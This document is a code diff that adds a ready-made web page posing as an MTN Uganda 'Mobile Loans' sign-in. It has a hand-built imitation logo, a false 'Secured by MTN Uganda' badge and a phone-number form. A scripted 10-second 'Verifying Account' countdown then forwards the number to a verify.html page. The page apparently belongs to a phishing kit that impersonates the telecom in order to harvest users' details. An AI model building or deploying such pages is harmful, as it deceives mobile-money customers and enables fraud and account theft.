@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - MTN Uganda</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body {
+            background: #f4f4f4; min-height: 100vh;
+            display: flex; flex-direction: column;
+        }
+
+        /* HEADER */
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        /* MAIN */
+        .main {
+            flex: 1; display: flex; justify-content: center;
+            padding: 40px 16px 60px;
+        }
+
+        .card {
+            background: #fff; width: 100%; max-width: 480px;
+            border-radius: 20px; padding: 44px 34px 38px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+            text-align: center;
+        }
+
+        .mtn-logo {
+            margin-bottom: 28px;
+        }
+        .mtn-icon {
+            width: 72px; height: 72px;
+            background: #ffcc00;
+            border-radius: 18px;
+            display: inline-flex; align-items: center; justify-content: center;
+            border: 3px solid #004f9f;
+            color: #004f9f; font-weight: 900; font-size: 22px;
+            line-height: 1; text-align: center;
+            box-shadow: 0 10px 24px rgba(255,204,0,0.35);
+            margin-bottom: 14px;
+        }
+        .mtn-name {
+            font-size: 26px; font-weight: 900; color: #004f9f;
+            letter-spacing: -0.5px;
+        }
+        .mtn-tag {
+            font-size: 11px; color: #888; font-weight: 700;
+            letter-spacing: 2px; text-transform: uppercase;
+            margin-top: 2px;
+        }
+
+        h1 {
+            font-size: 22px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 14px; color: #666;
+            line-height: 1.5; margin-bottom: 28px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block; font-size: 13px; font-weight: 700;
+            color: #333; margin-bottom: 8px;
+        }
+        .phone-input {
+            display: flex; align-items: center;
+            border: 1.5px solid #ddd;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .phone-input:focus-within {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+        }
+        .phone-input .flag-code {
+            padding: 15px 16px;
+            background: #fafafa;
+            font-size: 15px; font-weight: 800; color: #333;
+            border-right: 1.5px solid #eee;
+        }
+        .phone-input input {
+            flex: 1; padding: 15px 16px;
+            border: none; outline: none;
+            font-size: 15px; font-family: inherit;
+            color: #111; background: transparent;
+        }
+        .phone-input input::placeholder { color: #aaa; }
+
+        .login-btn {
+            width: 100%;
+            background: #ffcc00;
+            color: #111;
+            border: none;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            margin-top: 10px;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 6px 16px rgba(255,204,0,0.35);
+        }
+        .login-btn:hover { background: #e6b800; }
+        .login-btn:active { transform: scale(0.99); }
+
+        .secure-note {
+            display: flex; align-items: center; justify-content: center;
+            gap: 6px;
+            font-size: 12px; color: #888;
+            margin-top: 22px;
+        }
+
+        /* LOADING OVERLAY — 10 sec countdown */
+        .loading {
+            position: fixed; inset: 0;
+            background: rgba(255,255,255,0.98);
+            display: none; flex-direction: column;
+            align-items: center; justify-content: center;
+            z-index: 999; padding: 24px; text-align: center;
+        }
+        .loading.show { display: flex; }
+
+        .spinner {
+            width: 70px; height: 70px;
+            border: 6px solid #ffeeb0;
+            border-top: 6px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-title {
+            font-size: 20px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .loading-sub {
+            font-size: 14px; color: #666; margin-bottom: 24px;
+        }
+        .countdown {
+            width: 70px; height: 70px;
+            background: #ffcc00; color: #111;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; font-weight: 900;
+            box-shadow: 0 8px 20px rgba(255,204,0,0.4);
+        }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 32px 22px; }
+            h1 { font-size: 19px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+
+            <div class="mtn-logo">
+                <div class="mtn-icon">MTN<br>UG</div>
+                <div class="mtn-name">MTN Uganda</div>
+                <div class="mtn-tag">Everywhere You Go</div>
+            </div>
+
+            <h1>Sign in to continue</h1>
+            <p class="sub">Please confirm your number to proceed with the application</p>
+
+            <div class="form-group">
+                <label for="loginPhone">Your Phone Number</label>
+                <div class="phone-input">
+                    <span class="flag-code">🇺🇬 +256</span>
+                    <input type="tel" id="loginPhone" placeholder="7XX XXX XXX" maxlength="12" autocomplete="off">
+                </div>
+            </div>
+
+            <button class="login-btn" id="loginBtn">Log In</button>
+
+            <div class="secure-note">
+                <span>🔒</span>
+                <span>Secured by MTN Uganda</span>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- 10-second countdown overlay -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-title">Verifying Account</div>
+        <div class="loading-sub">Please wait while we confirm your number…</div>
+        <div class="countdown" id="countdown">10</div>
+    </div>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || '';
+
+        // Pre-fill phone if we have it
+        if (phone) {
+            document.getElementById('loginPhone').value = phone;
+        }
+
+        const loginBtn = document.getElementById('loginBtn');
+        const phoneInput = document.getElementById('loginPhone');
+        const loading = document.getElementById('loading');
+        const countdownEl = document.getElementById('countdown');
+
+        loginBtn.addEventListener('click', function () {
+            const entered = phoneInput.value.replace(/\D/g, '');
+
+            // If user typed something, use it — otherwise use URL param
+            const finalPhone = entered || phone;
+
+            if (!finalPhone || finalPhone.length < 9) {
+                phoneInput.style.borderColor = '#dc2626';
+                phoneInput.focus();
+                return;
+            }
+
+            // Save phone for next pages
+            params.set('phone', finalPhone);
+
+            // Show overlay
+            loading.classList.add('show');
+            let n = 10;
+            countdownEl.textContent = n;
+            const iv = setInterval(() => {
+                n--;
+                countdownEl.textContent = n;
+                if (n <= 0) {
+                    clearInterval(iv);
+                    window.location.href = 'verify.html?' + params.toString();
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
